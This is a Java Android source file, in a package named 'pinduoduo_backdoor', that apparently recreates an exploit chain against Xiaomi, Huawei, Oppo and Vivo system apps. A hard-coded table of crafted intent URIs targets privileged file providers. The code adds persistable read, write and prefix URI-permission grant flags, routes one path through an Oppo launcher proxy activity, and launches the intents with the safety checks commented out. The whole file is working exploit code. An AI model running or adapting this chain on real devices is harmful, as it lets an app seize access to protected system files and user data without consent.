package com.tech.pinduoduo_backdoor;

import static android.content.Context.MODE_PRIVATE;

import android.annotation.SuppressLint;
import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Parcelable;
import android.text.TextUtils;

import com.android.launcher3.proxy.StartActivityParams;

import java.util.HashMap;
import java.util.UUID;

public class FileProviderV2 {
    private static FileProviderV2 fileProviderV2;
    private final HashMap<String, IntentWrapper> remoteSceneConfig = getRemoteUriConfig();
    private final HashMap<String, IntentWrapper> localSceneConfig = getDefaultUriConfig();

    public static FileProviderV2 instance() {
        if (fileProviderV2 == null) {
            fileProviderV2 = new FileProviderV2();
        }
        return fileProviderV2;
    }

    private HashMap<String, IntentWrapper> getRemoteUriConfig() {
        return new HashMap();
    }

    private HashMap<String, IntentWrapper> getDefaultUriConfig() {
        HashMap<String, IntentWrapper> hashMap = new HashMap<String, IntentWrapper>();
        hashMap.put("XM_BW_UPDATE_DB", new IntentWrapper("XM_BW_UPDATE_DB", "content://com.miui.securitycore.fileProvider/root_files#Intent;component=com.tech.pinduoduo_backdoor/com.tech.pinduoduo_backdoor.alive.impl.provider.component.HFPActivity;B.need_transit=true;end", "content://com.miui.securitycore.fileProvider/root_files", true, false, -2147450685, "", ""));
        hashMap.put("HW_SS_UPDATE_DB", new IntentWrapper("HW_SS_UPDATE_DB", "content://com.android.settings.files/my_root#Intent;component=com.tech.pinduoduo_backdoor/com.tech.pinduoduo_backdoor.alive.impl.provider.component.HFPActivity;end", "content://com.android.settings.files/my_root", false, false, 0, "", ""));
        hashMap.put("provider_oppo_au", new IntentWrapper("provider_oppo_au", "content://com.coloros.phonemanager.files/clear_share#Intent;component=com.tech.pinduoduo_backdoor/com.tech.pinduoduo_backdoor.alive.impl.provider.component.HFPActivity;end", "content://com.coloros.phonemanager.files/clear_share", false, false, 0, "", ""));
        hashMap.put("hw_hwid", new IntentWrapper("hw_hwid", "content://com.huawei.hms.install.apkInstallProvider/hwid#Intent;component=com.tech.pinduoduo_backdoor/com.tech.pinduoduo_backdoor.alive.impl.provider.component.HFPActivity;end", "content://com.huawei.hms.install.apkInstallProvider/hwid", false, true, 0, "#Intent;component=com.huawei.hwid/com.tencent.connect.common.AssistActivity;S.appid=ac7qdi5y2op;end", "openSDK_LOG.AssistActivity.ExtraIntent"));
        hashMap.put("HW_HB_UPDATE_SP", new IntentWrapper("HW_HB_UPDATE_SP", "content://com.huawei.intelligent.fastapp.engine.fileProvider/root_path#Intent;component=com.tech.pinduoduo_backdoor/com.tech.pinduoduo_backdoor.alive.impl.provider.component.HFPActivity;end", "content://com.huawei.intelligent.fastapp.engine.fileProvider/root_path", false, true, 0, "#Intent;component=com.huawei.intelligent/com.huawei.hms.activity.BridgeActivity;S.intent.extra.DELEGATE_CLASS_OBJECT=com.huawei.hms.adapter.ui.BaseResolutionAdapter;end", "resolution"));
        hashMap.put("oppo_launcher_update", new IntentWrapper("oppo_launcher_update", "content://com.android.launcher.file_provider/root#Intent;component=com.tech.pinduoduo_backdoor/com.tech.pinduoduo_backdoor.alive.impl.provider.component.HFPActivity;end", "content://com.android.launcher.file_provider/root", false, false, 0, "", ""));
        hashMap.put("HSS_UPDATE_XML", new IntentWrapper("HSS_UPDATE_XML", "content://com.android.settings.files/my_root#Intent;component=com.tech.pinduoduo_backdoor/com.tech.pinduoduo_backdoor.alive.impl.provider.component.HFPActivity;end", "content://com.android.settings.files/my_root", false, false, 0, "", ""));
        hashMap.put("provider_oppo_ld", new IntentWrapper("provider_oppo_ld", "content://com.coloros.phonemanager.files/clear_share#Intent;component=com.tech.pinduoduo_backdoor/com.tech.pinduoduo_backdoor.alive.impl.provider.component.HFPActivity;end", "content://com.coloros.phonemanager.files/clear_share", false, false, 0, "", ""));
        hashMap.put("VIVO_PM_UPDATE", new IntentWrapper("VIVO_PM_UPDATE", "content://com.android.settings.fileprovider/root_files#Intent;component=com.tech.pinduoduo_backdoor/com.tech.pinduoduo_backdoor.alive.impl.provider.component.HFPActivity;end", "content://com.android.settings.fileprovider/root_files", false, false, 0, "", ""));
        hashMap.put("VIVO_PM_UPDATE_V2", new IntentWrapper("VIVO_PM_UPDATE_V2", "content://com.vivo.assistant.upgrade#Intent;component=com.tech.pinduoduo_backdoor/com.tech.pinduoduo_backdoor.alive.impl.provider.component.HFPActivity;end", "content://com.vivo.assistant.upgrade", false, false, 0, "", ""));

        return hashMap;
    }

    public IFPUtils fileProviderUtils() {
        return IFPUtils.instance();
    }

    public boolean requestGrantPermission(String scene) {
        String src = "test";
        return startGrantPermission(scene, src);
    }

    private IntentWrapper obtainNewestIntent(String str) {
        return this.remoteSceneConfig.get(str) != null ? (IntentWrapper) this.remoteSceneConfig.get(str) : (IntentWrapper) this.localSceneConfig.get(str);
    }


    @SuppressLint("WrongConstant")
    public Intent decorateForOppoLP(Intent intent) {
        Intent intent2 = new Intent();
        //intent2.addFlags(8486912);
        intent2.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_NO_ANIMATION | Intent.FLAG_ACTIVITY_CLEAR_TASK);
        int requestCode = 0;
        StartActivityParams startActivityParams = new StartActivityParams(intent, requestCode);
        intent2.putExtra("start-activity-params", (Parcelable)startActivityParams);
        String i = "com.oppo.launcher";
        intent2.setComponent(new ComponentName(i, "com.android.launcher3.proxy.ProxyActivityStarter"));

        return intent2;
    }

    public Intent obtainIntent(IntentWrapper intentWrapper, String str, String str2, String str3) {
        try {
            Boolean isReadWriteOnly = intentWrapper.getIsReadWriteOnly();
            Intent parseUri = Intent.parseUri(intentWrapper.getTargetIntent(), 0);
            parseUri.putExtra("fp_scene", str);
            parseUri.putExtra("fp_src", str2);
            parseUri.putExtra("fp_request_id", str3);
            parseUri.putExtra("fp_start_ts", String.valueOf(System.currentTimeMillis()));
            parseUri.addFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION);
            if (isReadWriteOnly == null || isReadWriteOnly.booleanValue()) {
                parseUri.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            }
            if (isReadWriteOnly == null || !isReadWriteOnly.booleanValue()) {
                parseUri.addFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
            }
            if (Build.VERSION.SDK_INT >= 21) {
                parseUri.addFlags(Intent.FLAG_GRANT_PREFIX_URI_PERMISSION);
            }
            Intent intent = null;
            if (intentWrapper.isNeedSpecialFlags()) {
                //0x808000c3
                parseUri.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION | Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION |
                        Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
                //parseUri.addFlags(intentWrapper.getFlags());
            }

            if (intentWrapper.isNeedTransit()) {

            } else {
                intent = TextUtils.equals(intentWrapper.getScene(), "oppo_launcher_update") ? decorateForOppoLP(parseUri) : parseUri;
            }

            return intent;
        } catch (Exception e) {

        }
        return null;
    }

    public boolean startGrantPermission(String str, String str2) {
        String uuid = UUID.randomUUID().toString();
        IntentWrapper obtainNewestIntent = obtainNewestIntent(str);
        if (obtainNewestIntent == null) {
            Logger.debug("skip grant perm for scene not valid");
            return false;
        }
        Intent obtainIntent = obtainIntent(obtainNewestIntent, str, str2, uuid);
        if (obtainIntent == null) {
            Logger.debug("skip grant perm for intent not valid");
            return false;
        }
        return startGrantPermission(str, str2, obtainIntent, obtainNewestIntent.getTargetUri(), obtainNewestIntent.getIsReadWriteOnly());
    }

    private boolean startGrantPermission(String str, String str2, Intent intent, String str3, Boolean bool) {
//        Logger.i("LVBA.AliveModule.Provider.DefaultFileProviderImpl", "startGrantPermission invoked, scene : %s, src : %s , target intent : %s", new Object[]{str, str2, intent});
//        if (!isABEnableDefaultTrue("pinduoduo_Android.ka_providerV2_grant_perm_57500")) {
//            Logger.i("LVBA.AliveModule.Provider.DefaultFileProviderImpl", "skip grant perm for ab not enable");
//            ProviderV2Track.trackGrantPermissionStart(str, str2, false, "ab_disable");
//            return false;
//        } else if (hasPermission(str, str3, bool)) {
//            Logger.i("LVBA.AliveModule.Provider.DefaultFileProviderImpl", "skip grant perm for already has perm");
//            ProviderV2Track.trackGrantPermissionStart(str, str2, false, "has_permission");
//            return false;
//        } else if (AliveStartupUtils.isFilterByBoxLock()) {
//            Logger.i("LVBA.AliveModule.Provider.DefaultFileProviderImpl", "skip grant perm for box lock");
//            ProviderV2Track.trackGrantPermissionStart(str, str2, false, "box_lock");
//            return false;
//        } else if (intent == null) {
//            Logger.i("LVBA.AliveModule.Provider.DefaultFileProviderImpl", "skip grant permission since intent from config is null");
//            ProviderV2Track.trackGrantPermissionStart(str, str2, false, "intent_null");
//            return false;
//        } else if (isABEnableDefaultFalse("pinduoduo_Android.ka_fp_v2_grant_perm_by_system_ui_60000")) {
//            Logger.i("LVBA.AliveModule.Provider.DefaultFileProviderImpl", "start grant permission by system ui");
//            return startGrantPermissionBySystemUi(str, str2, intent);
//        } else if (isABEnableDefaultFalse("pinduoduo_Android.ka_fp_v2_grant_perm_by_input_60000")) {
//            Logger.i("LVBA.AliveModule.Provider.DefaultFileProviderImpl", "start grant permission by input");
//            return startGrantPermissionByInput(str, str2, intent);
//        } else if (!AliveModule.instance().isSupportPullSpecialActivity()) {
//            Logger.i("LVBA.AliveModule.Provider.DefaultFileProviderImpl", "skip grant permission since AlivePullStartUp not support");
//            ProviderV2Track.trackGrantPermissionStart(str, str2, false, "pull_not_support");
//            return false;
//        } else {
            Logger.debug("LVBA.AliveModule.Provider.DefaultFileProviderImpl" + " start grant permission by AlivePullStartUp");
            AliveModule.instance().pullSpecialActivity(intent);
            //ProviderV2Track.trackGrantPermissionStart(str, str2, true, null);
            Logger.debug("LVBA.AliveModule.Provider.DefaultFileProviderImpl" + " scene %s grant permission success");
            return true;
        }
}
